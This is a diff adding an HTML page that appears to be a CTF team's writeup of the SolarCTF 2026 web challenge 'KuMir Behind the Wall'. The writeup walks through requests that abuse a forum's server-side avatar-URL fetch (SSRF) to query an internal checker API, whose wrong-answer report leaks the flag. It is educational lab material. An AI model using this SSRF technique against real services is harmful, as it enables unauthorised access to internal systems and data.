@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>KuMir Behind the Wall · SolarCTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="Forum breadcrumbs point at an internal checker API. The avatar URL field fetches server-side, so a wrong answer submitted through it makes the checker report the expected answer, which is the flag." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=0e2bdd96" />
+<link rel="stylesheet" href="../css/pages.css?v=8dc67e7f" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <span>kumir-behind-the-wall</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>KuMir Behind the Wall <span class="page-sub">SSRF through an avatar URL</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>FLAG: SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}</p>
+<h1>KuMir Behind the Wall - Writeup</h1>
+<h2 id="challenge"><a class="wu-anchor" href="#challenge" aria-hidden="true">#</a>Challenge</h2>
+<p>Category: Web</p>
+<blockquote>
+<p>The Robot hit a wall, the homework wasn&#39;t saved, and the admin is fixing the printer. After
+the school server migration, the reference answer for the final assignment <code>robot-final</code> went
+missing. Explore the Kletochka forum and recover it before the teacher schedules a retake.</p>
+</blockquote>
+<p>Target: <code>https://kumir-behind-the-wall.solarctf.ru</code></p>
+<h2 id="architecture"><a class="wu-anchor" href="#architecture" aria-hidden="true">#</a>Architecture</h2>
+<p>From <code>docker-compose.yml</code>:</p>
+<ul>
+<li><strong>web</strong> - Flask/gunicorn on port 8000, on networks <code>govnonet</code> (internal) and <code>edge</code> (public)</li>
+<li><strong>kumir-checker</strong> - on <code>govnonet</code> only, health at <code>http://127.0.0.1:8081/health</code></li>
+</ul>
+<p>The <code>govnonet</code> network is <code>internal: true</code>, so <code>kumir-checker</code> is unreachable from the internet
+but reachable from the <code>web</code> service. Classic SSRF setup.</p>
+<h2 id="recon-forum-breadcrumbs"><a class="wu-anchor" href="#recon-forum-breadcrumbs" aria-hidden="true">#</a>Recon - Forum Breadcrumbs</h2>
+<h3 id="1-the-target-checker-api"><a class="wu-anchor" href="#1-the-target-checker-api" aria-hidden="true">#</a>1. The target: checker API</h3>
+<p>In <code>/topic/final-work</code>, post #2 by <code>admin_7b</code> reveals:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">проверяльщик: http://kumir-checker:8081
+итоговая работа: robot-final</code></pre>
+      
+    </figure><p>The checker is on the internal network. The assignment we need is <code>robot-final</code>.</p>
+<h3 id="2-the-ssrf-vector-avatar-url"><a class="wu-anchor" href="#2-the-ssrf-vector-avatar-url" aria-hidden="true">#</a>2. The SSRF vector: avatar URL</h3>
+<p>In <code>/topic/avatar</code> and <code>/profile</code>, the forum lets users set an avatar by URL:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">html</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-html">&lt;form method=&quot;post&quot; action=&quot;/profile/avatar&quot;&gt;
+  &lt;input name=&quot;avatar_url&quot; type=&quot;text&quot; placeholder=&quot;https://...&quot;&gt;
+&lt;/form&gt;</code></pre>
+      
+    </figure><p>The avatar is then proxied through <code>/api/avatar/me</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">html</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-html">&lt;img class=&quot;avatar-preview&quot; src=&quot;/api/avatar/me&quot; alt=&quot;...&quot;&gt;</code></pre>
+      
+    </figure><p>The server fetches the user-supplied URL server-side and proxies the response body through
+<code>/api/avatar/me</code>. This is a <strong>Server-Side Request Forgery (SSRF)</strong> vector.</p>
+<h3 id="3-teacher-hint-about-error-reports"><a class="wu-anchor" href="#3-teacher-hint-about-error-reports" aria-hidden="true">#</a>3. Teacher hint about error reports</h3>
+<p>In <code>/topic/final-work</code>, post #3, the teacher says:</p>
+<blockquote>
+<p>На неверный ответ проверяльщик пишет подробно - специально для преподавателя.</p>
+</blockquote>
+<p>(&quot;The checker writes detailed reports for wrong answers - specifically for the teacher.&quot;)</p>
+<p>This hints that submitting a wrong answer yields useful information.</p>
+<h2 id="exploitation"><a class="wu-anchor" href="#exploitation" aria-hidden="true">#</a>Exploitation</h2>
+<h3 id="step-1-confirm-ssrf-via-health-endpoint"><a class="wu-anchor" href="#step-1-confirm-ssrf-via-health-endpoint" aria-hidden="true">#</a>Step 1: Confirm SSRF via health endpoint</h3>
+<p>Set avatar URL to the checker&#39;s health endpoint:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">POST /profile/avatar
+avatar_url=http://kumir-checker:8081/health</code></pre>
+      
+    </figure><p>Then fetch <code>/api/avatar/me</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">GET /api/avatar/me
+→ {&quot;ok&quot;: true, &quot;runtime&quot;: &quot;Kumir 2&quot;}</code></pre>
+      
+    </figure><p>SSRF confirmed - the web app fetches internal URLs and returns their content.</p>
+<h3 id="step-2-discover-the-checker-api"><a class="wu-anchor" href="#step-2-discover-the-checker-api" aria-hidden="true">#</a>Step 2: Discover the checker API</h3>
+<p>Set avatar URL to the checker root:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">POST /profile/avatar
+avatar_url=http://kumir-checker:8081/</code></pre>
+      
+    </figure><p>Response via <code>/api/avatar/me</code>:</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-attr">&quot;diagnostic&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Kumir 2 teacher checker\nGET /teacher/check?task=robot-final&amp;answer=&lt;one-line answer&gt;\nContent-Type: not required; parameters go in the query string\nCorrect answer: 200, OK. Wrong answer: 422, teacher report.\n&quot;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><p>The API is: <code>GET /teacher/check?task=robot-final&amp;answer=&lt;answer&gt;</code></p>
+<ul>
+<li>Correct: 200</li>
+<li>Wrong: 422 with a &quot;teacher report&quot;</li>
+</ul>
+<h3 id="step-3-submit-a-wrong-answer-to-get-the-teacher-report"><a class="wu-anchor" href="#step-3-submit-a-wrong-answer-to-get-the-teacher-report" aria-hidden="true">#</a>Step 3: Submit a wrong answer to get the teacher report</h3>
+<p>Set avatar URL to the checker with a wrong answer. The <code>&amp;</code> in the URL must be properly
+encoded in the POST body (use <code>--data-urlencode</code> with curl):</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">POST /profile/avatar
+avatar_url=http://kumir-checker:8081/teacher/check?task=robot-final&amp;answer=test</code></pre>
+      
+    </figure><p>Then fetch <code>/api/avatar/me</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-text">HTTP/1.1 422 UNPROCESSABLE ENTITY
+Content-Type: application/octet-stream
+
+{&quot;verdict&quot;: &quot;WA&quot;, &quot;expected&quot;: &quot;SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}&quot;, &quot;received&quot;: &quot;test&quot;}</code></pre>
+      
+    </figure><p>The checker&#39;s &quot;teacher report&quot; for wrong answers includes the expected answer directly.</p>
+<h3 id="step-4-verify-the-flag"><a class="wu-anchor" href="#step-4-verify-the-flag" aria-hidden="true">#</a>Step 4: Verify the flag</h3>
+<p>Submit the correct answer:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-text">POST /profile/avatar
+avatar_url=http://kumir-checker:8081/teacher/check?task=robot-final&amp;answer=SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}</code></pre>
+      
+    </figure><p>Response via <code>/api/avatar/me</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-11" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-11"><code class="language-text">HTTP/1.1 200 OK
+
+{&quot;verdict&quot;: &quot;OK&quot;}</code></pre>
+      
+    </figure><h2 id="vulnerability-class"><a class="wu-anchor" href="#vulnerability-class" aria-hidden="true">#</a>Vulnerability Class</h2>
+<p><strong>SSRF (Server-Side Request Forgery)</strong> - The avatar URL feature allows users to specify
+arbitrary URLs, which the server fetches without restricting the target to external hosts.
+This allows access to internal services on the <code>govnonet</code> network that are otherwise
+unreachable from the internet.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-12" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-12"><code class="language-text">SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}</code></pre>
+      
+    </figure>
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#challenge">Challenge</a></li><li><a href="#architecture">Architecture</a></li><li><a href="#recon-forum-breadcrumbs">Recon - Forum Breadcrumbs</a><ol class="wu-toc-sub"><li><a href="#1-the-target-checker-api">1. The target: checker API</a></li><li><a href="#2-the-ssrf-vector-avatar-url">2. The SSRF vector: avatar URL</a></li><li><a href="#3-teacher-hint-about-error-reports">3. Teacher hint about error reports</a></li></ol></li><li><a href="#exploitation">Exploitation</a><ol class="wu-toc-sub"><li><a href="#step-1-confirm-ssrf-via-health-endpoint">Step 1: Confirm SSRF via health endpoint</a></li><li><a href="#step-2-discover-the-checker-api">Step 2: Discover the checker API</a></li><li><a href="#step-3-submit-a-wrong-answer-to-get-the-teacher-report">Step 3: Submit a wrong answer to get the teacher report</a></li><li><a href="#step-4-verify-the-flag">Step 4: Verify the flag</a></li></ol></li><li><a href="#vulnerability-class">Vulnerability Class</a></li><li><a href="#flag">Flag</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="neuropet.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Neuropet</span></a>
+    <a class="wu-pager-link wu-pager-next" href="the-missing-archive.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">The Missing Archive</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=4dd8bec6"></script>
+</body>
+</html>
